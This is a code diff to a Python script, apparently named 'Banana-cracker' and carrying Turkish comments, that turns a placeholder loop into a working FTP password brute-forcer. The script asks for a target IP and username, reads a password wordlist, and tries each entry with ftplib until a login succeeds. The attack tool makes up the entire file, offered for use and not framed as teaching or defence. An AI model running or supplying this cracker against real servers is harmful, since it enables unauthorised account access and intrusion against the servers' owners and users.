@@ -1,32 +1,43 @@
+import ftplib
 import time
-import os
 
-print("Target IP:")
-target_ip = input("> ")
+print("🔒 Target IP:")
+target = input("> ")
 
-print("Do you want to use passlist.txt? (y/n)")
-use_list = input("> ").lower()
+print("👤 FTP username (leave blank for 'anonymous'):")
+username = input("> ").strip()
+if username == "":
+    username = "anonymous"
 
-if use_list == "y":
-    wordlist_path = "passlist.txt"
-else:
-    print("Type your password list path (relative to Banana-cracker/):")
-    wordlist_path = input("> ")
+print("📁 Password list file (example: passlist.txt):")
+wordlist_path = input("> ").strip()
 
-# Dosya var mı kontrol et
-if not os.path.isfile(wordlist_path):
-    print("❌ File not found:", wordlist_path)
+# Şifre listesini oku
+try:
+    with open(wordlist_path, "r", encoding="latin-1") as file:
+        passwords = file.readlines()
+except FileNotFoundError:
+    print("❌ Password list not found.")
     exit()
 
-# Şifreleri oku
-with open(wordlist_path, "r", encoding="latin-1") as file:
-    passwords = file.readlines()
+print(f"\n🚀 Starting FTP brute-force on {target} as {username}...\n")
 
-print(f"\n🚀 Starting brute-force on {target_ip} using {len(passwords)} passwords...\n")
-
+# Şifreleri sırayla dene
 for password in passwords:
     password = password.strip()
     print(f"🔍 Trying password: {password}")
-    time.sleep(0.05)
+    try:
+        ftp = ftplib.FTP(target)
+        ftp.login(user=username, passwd=password)
+        print(f"\n✅ Success! Password found: {password}")
+        ftp.quit()
+        break
+    except ftplib.error_perm:
+        print("❌ Login failed")
+    except Exception as e:
+        print("⚠️ Error:", e)
+        break
+    time.sleep(0.1)
 
-print("\n✅ Done.")
+else:
+    print("\n🔚 Done. No password matched.")
